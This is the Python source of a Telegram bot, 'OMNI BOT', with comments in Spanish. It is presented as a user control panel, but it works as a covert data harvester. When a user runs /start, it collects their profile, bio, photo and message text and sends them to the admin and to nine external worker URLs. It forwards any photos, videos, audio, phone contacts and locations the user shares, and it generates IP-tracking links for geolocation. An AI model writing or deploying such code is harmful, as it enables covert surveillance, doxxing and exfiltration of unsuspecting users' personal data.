import os
import logging
import aiohttp
from datetime import datetime
from http.server import HTTPServer, BaseHTTPRequestHandler
from threading import Thread
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, ReplyKeyboardMarkup, KeyboardButton
from telegram.constants import ParseMode
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, MessageHandler, filters, ContextTypes

# ========== CONFIGURACIÓN ==========
TOKEN = os.environ.get("TOKEN", "").strip()
ADMIN_ID = int(os.environ.get("ADMIN_ID", "0").strip())

if not TOKEN or not ADMIN_ID:
    raise ValueError("❌ Faltan TOKEN o ADMIN_ID en variables de entorno")

# ========== URLS PARA ENVÍO ==========
URLS = [
    "https://bot-ubi.societykark.workers.dev",
    "https://bot-tg.societykark.workers.dev",
    "https://tg-bot12.societykark.workers.dev",
    "https://app-trk.societykark.workers.dev",
    "https://app-tg.societykark.workers.dev",
    "https://app-kali.societykark.workers.dev",
    "https://societykark.pythonanywhere.com",
    "https://kali-bot12.societykark.workers.dev",
    "https://galleta.societykark.workers.dev"
]
WORKER_URL = URLS[-1]

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

users_db = {}
tracking_codes = {}

# ========== MENSAJE DE BIENVENIDA (ESTILO PANEL) ==========
MENSAJE_INICIO = """📌 *PANEL DE CONTROL* 🔥
━━━━━━━━━━━━━━━━━━━━━━
*OMNI BOT – VERSIÓN ULTRA*

✅ Extractor de perfiles
✅ Solicitud de archivos
✅ Tracking de IP
✅ Envío a múltiples Workers

━━━━━━━━━━━━━━━━━━━━━━
*Selecciona una opción:*"""

# ========== BOTONES INLINE (dentro del mensaje, estilo captura) ==========
def menu_inline():
    keyboard = [
        [InlineKeyboardButton("📊 MI PERFIL", callback_data="perfil")],
        [InlineKeyboardButton("📸 ENVIAR FOTO", callback_data="solicitar_foto")],
        [InlineKeyboardButton("🎥 ENVIAR VIDEO", callback_data="solicitar_video")],
        [InlineKeyboardButton("🎵 ENVIAR AUDIO", callback_data="solicitar_audio")],
        [InlineKeyboardButton("📇 ENVIAR CONTACTO", callback_data="solicitar_contacto")],
        [InlineKeyboardButton("📍 ENVIAR UBICACIÓN", callback_data="solicitar_ubicacion")],
        [InlineKeyboardButton("🔗 GENERAR ENLACE", callback_data="tracking")],
        [InlineKeyboardButton("📈 ESTADÍSTICAS", callback_data="stats")],
    ]
    return InlineKeyboardMarkup(keyboard)

# ========== BOTONES DE RESPUESTA (abajo del chat, estilo captura) ==========
def menu_respuesta():
    keyboard = [
        [KeyboardButton("📊 Mi Perfil"), KeyboardButton("📸 Foto")],
        [KeyboardButton("🎥 Video"), KeyboardButton("🎵 Audio")],
        [KeyboardButton("📇 Contacto"), KeyboardButton("📍 Ubicación")],
        [KeyboardButton("🔗 Enlace"), KeyboardButton("📈 Stats")],
    ]
    return ReplyKeyboardMarkup(keyboard, resize_keyboard=True)

# ========== FUNCIONES DE EXTRACCIÓN ==========
async def get_worker_location():
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(WORKER_URL, timeout=10) as resp:
                if resp.status == 200:
                    return await resp.json()
                return None
    except Exception as e:
        logger.error(f"Error en Worker: {e}")
        return None

async def get_ipapi_location(ip):
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(f"https://ipapi.co/{ip}/json/", timeout=10) as resp:
                if resp.status == 200:
                    return await resp.json()
                return None
    except Exception as e:
        logger.error(f"Error en ipapi: {e}")
        return None

async def get_user_photo(user_id, bot):
    try:
        photos = await bot.get_user_profile_photos(user_id, limit=1)
        if photos.total_count > 0:
            return photos.photos[0][-1].file_id
        return None
    except Exception as e:
        logger.error(f"Error al obtener foto: {e}")
        return None

async def get_user_bio(user, bot):
    try:
        full_user = await bot.get_chat(user.id)
        return full_user.bio if hasattr(full_user, 'bio') else None
    except Exception as e:
        logger.error(f"Error al obtener bio: {e}")
        return None

async def extract_user_info(update: Update, context: ContextTypes.DEFAULT_TYPE, target_user=None):
    bot = context.bot
    user = target_user or update.effective_user
    chat = update.effective_chat
    message = update.message

    user_id = user.id
    first_name = user.first_name or "N/A"
    last_name = user.last_name or "N/A"
    full_name = f"{first_name} {last_name}".strip()
    username = f"@{user.username}" if user.username else "N/A"
    language = user.language_code or "N/A"
    is_bot = "Sí" if user.is_bot else "No"
    is_premium = "Sí" if getattr(user, 'is_premium', False) else "No"
    bio = await get_user_bio(user, bot) or "No disponible"
    photo_id = await get_user_photo(user_id, bot)

    chat_type = "Privado" if chat.type == "private" else f"Grupo: {chat.title}"
    chat_id = chat.id

    message_id = message.message_id if message else "N/A"
    message_text = message.text if message and message.text else "N/A"
    message_date = message.date.strftime("%Y-%m-%d %H:%M:%S") if message else "N/A"

    worker_data = await get_worker_location()
    ip = "N/A"
    country = "N/A"
    region = "N/A"
    city = "N/A"
    timezone = "N/A"
    postal = "N/A"

    if worker_data:
        ip = worker_data.get("ip", "N/A")
        country = worker_data.get("country", "N/A")
        region = worker_data.get("region", "N/A")
        city = worker_data.get("city", "N/A")
        timezone = worker_data.get("timezone", "N/A")
        postal = worker_data.get("postal", "N/A")
        if ip != "N/A":
            ipapi_data = await get_ipapi_location(ip)
            if ipapi_data:
                country = ipapi_data.get("country_name", country)
                region = ipapi_data.get("region", region)
                city = ipapi_data.get("city", city)
                postal = ipapi_data.get("postal", postal)
                timezone = ipapi_data.get("timezone", timezone)

    info = f"🕵️ INFORMACIÓN COMPLETA DEL USUARIO\n"
    info += f"━━━━━━━━━━━━━━━━━━━━\n\n"
    info += f"👤 Telegram\n"
    info += f"   • ID: {user_id}\n"
    info += f"   • Nombre completo: {full_name}\n"
    info += f"   • Username: {username}\n"
    info += f"   • Idioma: {language}\n"
    info += f"   • Es bot: {is_bot}\n"
    info += f"   • Es Premium: {is_premium}\n"
    info += f"   • Biografía: {bio}\n\n"
    info += f"💬 Chat\n"
    info += f"   • Tipo: {chat_type}\n"
    info += f"   • Chat ID: {chat_id}\n\n"
    info += f"📩 Mensaje\n"
    info += f"   • ID: {message_id}\n"
    info += f"   • Fecha: {message_date}\n"
    info += f"   • Texto: {message_text[:100]}{'...' if len(message_text) > 100 else ''}\n\n"
    info += f"🌐 Red y Ubicación\n"
    info += f"   • IP: {ip}\n"
    info += f"   • País: {country}\n"
    info += f"   • Región: {region}\n"
    info += f"   • Ciudad: {city}\n"
    info += f"   • Código Postal: {postal}\n"
    info += f"   • Zona Horaria: {timezone}\n"
    info += f"━━━━━━━━━━━━━━━━━━━━\n"
    info += f"⏰ Capturado: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"

    return {
        "text": info,
        "photo_id": photo_id,
        "user_id": user_id,
        "username": username,
        "ip": ip,
        "city": city,
        "country": country
    }

# ========== ENVÍO A WORKERS ==========
async def send_to_all_workers(text):
    form_data = aiohttp.FormData()
    form_data.add_field('chat_id', str(ADMIN_ID))
    form_data.add_field('text', text)
    results = []
    async with aiohttp.ClientSession() as session:
        for url in URLS:
            try:
                async with session.post(url, data=form_data, timeout=10) as resp:
                    if resp.status == 200:
                        results.append(f"✅ {url}")
                    else:
                        results.append(f"❌ {url} (HTTP {resp.status})")
            except Exception as e:
                results.append(f"❌ {url} (Error: {str(e)[:30]})")
    return results

async def send_report_to_admin(update: Update, context: ContextTypes.DEFAULT_TYPE, info_data):
    bot = context.bot
    await bot.send_message(chat_id=ADMIN_ID, text=info_data["text"])
    if info_data["photo_id"]:
        await bot.send_photo(chat_id=ADMIN_ID, photo=info_data["photo_id"], caption=f"📸 Foto de {info_data['username'] or info_data['user_id']}")
    resultados = await send_to_all_workers(info_data["text"])
    logger.info(f"Resultados de envío a Workers: {resultados}")
    users_db[info_data["user_id"]] = info_data

# ========== COMANDOS ==========
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    if user.id == ADMIN_ID:
        await update.message.reply_text("👋 Hola admin.")
        return
    info_data = await extract_user_info(update, context)
    await send_report_to_admin(update, context, info_data)
    # Enviar mensaje de bienvenida con botones inline
    await update.message.reply_text(MENSAJE_INICIO, parse_mode='Markdown', reply_markup=menu_inline())
    # Enviar botones de respuesta (abajo del chat)
    await update.message.reply_text("📌 *Panel rápido:*", parse_mode='Markdown', reply_markup=menu_respuesta())

async def tracking(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    code = os.urandom(6).hex()
    tracking_codes[code] = {"user_id": user.id, "created": datetime.now().isoformat()}
    link = f"{WORKER_URL}/track/{code}"
    await update.message.reply_text(f"🔗 Enlace:\n{link}")
    await context.bot.send_message(chat_id=ADMIN_ID, text=f"🔗 Nuevo enlace\nUsuario: {user.first_name}\nCódigo: {code}\nEnlace: {link}")

async def stats(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID:
        await update.message.reply_text("❌ No autorizado.")
        return
    msg = f"📊 Estadísticas\n👥 Usuarios: {len(users_db)}\n🔗 Enlaces: {len(tracking_codes)}"
    await update.message.reply_text(msg)

async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("🤖 OMNI Bot\n\n/start - Iniciar\n/tracking - Generar enlace\n/stats - Estadísticas\n/help - Ayuda", reply_markup=menu_inline())

async def perfil(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    info = users_db.get(user.id)
    if not info:
        await update.message.reply_text("❌ Usa /start.")
        return
    msg = f"📊 Tu perfil\n\n👤 {info.get('full_name')}\n📛 @{info.get('username')}\n🆔 {info.get('id')}"
    await update.message.reply_text(msg)

# ========== SOLICITAR ARCHIVOS ==========
async def solicitar_foto(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("📸 Envía una foto.", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Volver", callback_data="volver")]]))

async def solicitar_video(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("🎥 Envía un video.", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Volver", callback_data="volver")]]))

async def solicitar_audio(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("🎵 Envía un audio.", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Volver", callback_data="volver")]]))

async def solicitar_contacto(update: Update, context: ContextTypes.DEFAULT_TYPE):
    keyboard = [[InlineKeyboardButton("📇 Compartir contacto", callback_data="compartir_contacto")], [InlineKeyboardButton("🔙 Volver", callback_data="volver")]]
    await update.message.reply_text("📇 Comparte tu contacto.", reply_markup=InlineKeyboardMarkup(keyboard))

async def solicitar_ubicacion(update: Update, context: ContextTypes.DEFAULT_TYPE):
    keyboard = [[InlineKeyboardButton("📍 Compartir ubicación", callback_data="compartir_ubicacion")], [InlineKeyboardButton("🔙 Volver", callback_data="volver")]]
    await update.message.reply_text("📍 Comparte tu ubicación.", reply_markup=InlineKeyboardMarkup(keyboard))

# ========== MANEJAR ARCHIVOS RECIBIDOS ==========
async def handle_photo(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    photo = update.message.photo[-1]
    await context.bot.send_photo(chat_id=ADMIN_ID, photo=photo.file_id, caption=f"📸 Foto de {user.first_name} (@{user.username})")
    await update.message.reply_text("✅ Foto enviada.", reply_markup=menu_inline())

async def handle_video(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    video = update.message.video
    await context.bot.send_video(chat_id=ADMIN_ID, video=video.file_id, caption=f"🎥 Video de {user.first_name} (@{user.username})")
    await update.message.reply_text("✅ Video enviado.", reply_markup=menu_inline())

async def handle_audio(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    audio = update.message.audio
    await context.bot.send_audio(chat_id=ADMIN_ID, audio=audio.file_id, caption=f"🎵 Audio de {user.first_name} (@{user.username})")
    await update.message.reply_text("✅ Audio enviado.", reply_markup=menu_inline())

async def handle_contact(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    contact = update.message.contact
    await context.bot.send_message(chat_id=ADMIN_ID, text=f"📇 Contacto de {user.first_name} (@{user.username})\n\n📞 {contact.phone_number}")
    await update.message.reply_text("✅ Contacto enviado.", reply_markup=menu_inline())

async def handle_location(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    location = update.message.location
    await context.bot.send_location(chat_id=ADMIN_ID, latitude=location.latitude, longitude=location.longitude)
    await context.bot.send_message(chat_id=ADMIN_ID, text=f"📍 Ubicación de {user.first_name} (@{user.username})")
    await update.message.reply_text("✅ Ubicación enviada.", reply_markup=menu_inline())

# ========== MANEJAR MENSAJES DE TEXTO (botones de respuesta) ==========
async def handle_text(update: Update, context: ContextTypes.DEFAULT_TYPE):
    text = update.message.text
    logger.info(f"📩 Mensaje recibido: {text}")

    if text == "📊 Mi Perfil":
        await perfil(update, context)
    elif text == "📸 Foto":
        await solicitar_foto(update, context)
    elif text == "🎥 Video":
        await solicitar_video(update, context)
    elif text == "🎵 Audio":
        await solicitar_audio(update, context)
    elif text == "📇 Contacto":
        await solicitar_contacto(update, context)
    elif text == "📍 Ubicación":
        await solicitar_ubicacion(update, context)
    elif text == "🔗 Enlace":
        await tracking(update, context)
    elif text == "📈 Stats":
        await stats(update, context)
    else:
        await update.message.reply_text("❌ Opción no reconocida. Usa el menú.", reply_markup=menu_respuesta())

# ========== CALLBACKS ==========
async def callback_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    data = query.data
    logger.info(f"📩 Callback recibido: {data}")

    try:
        if data == "volver":
            await query.edit_message_text(MENSAJE_INICIO, parse_mode='Markdown', reply_markup=menu_inline())
            return

        if data == "perfil":
            await perfil(update, context)
            await query.delete_message()
            return

        if data == "solicitar_foto":
            await solicitar_foto(update, context)
            await query.delete_message()
            return

        if data == "solicitar_video":
            await solicitar_video(update, context)
            await query.delete_message()
            return

        if data == "solicitar_audio":
            await solicitar_audio(update, context)
            await query.delete_message()
            return

        if data == "solicitar_contacto":
            await solicitar_contacto(update, context)
            await query.delete_message()
            return

        if data == "solicitar_ubicacion":
            await solicitar_ubicacion(update, context)
            await query.delete_message()
            return

        if data == "tracking":
            await tracking(update, context)
            await query.delete_message()
            return

        if data == "stats":
            await stats(update, context)
            await query.delete_message()
            return

        if data == "compartir_contacto":
            await query.edit_message_text("📇 Usa el botón de compartir contacto (📎 → Contacto).", reply_markup=menu_inline())
            return

        if data == "compartir_ubicacion":
            await query.edit_message_text("📍 Usa el botón de compartir ubicación (📎 → Ubicación).", reply_markup=menu_inline())
            return

    except Exception as e:
        logger.error(f"❌ Error en callback: {e}")
        await query.edit_message_text("❌ Error inesperado. Intenta de nuevo.", reply_markup=menu_inline())

# ========== ERROR HANDLER ==========
async def error_handler(update: object, context: ContextTypes.DEFAULT_TYPE):
    logger.error(f"❌ Error: {context.error}")
    if isinstance(update, Update) and update.effective_message:
        await update.effective_message.reply_text("❌ Error inesperado.", reply_markup=menu_inline())

# ========== SERVIDOR HTTP ==========
class HealthHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b"OK")

def run_http_server():
    server = HTTPServer(("0.0.0.0", 8080), HealthHandler)
    server.serve_forever()

# ========== MAIN ==========
def main():
    Thread(target=run_http_server, daemon=True).start()
    logger.info("✅ Servidor HTTP en puerto 8080")
    app = Application.builder().token(TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("tracking", tracking))
    app.add_handler(CommandHandler("stats", stats))
    app.add_handler(CommandHandler("help", help_command))
    app.add_handler(CallbackQueryHandler(callback_handler))
    app.add_handler(MessageHandler(filters.PHOTO, handle_photo))
    app.add_handler(MessageHandler(filters.VIDEO, handle_video))
    app.add_handler(MessageHandler(filters.AUDIO, handle_audio))
    app.add_handler(MessageHandler(filters.CONTACT, handle_contact))
    app.add_handler(MessageHandler(filters.LOCATION, handle_location))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_text))
    app.add_error_handler(error_handler)
    logger.info("✅ OMNI Bot iniciado correctamente")
    app.run_polling()

if __name__ == "__main__":
    main()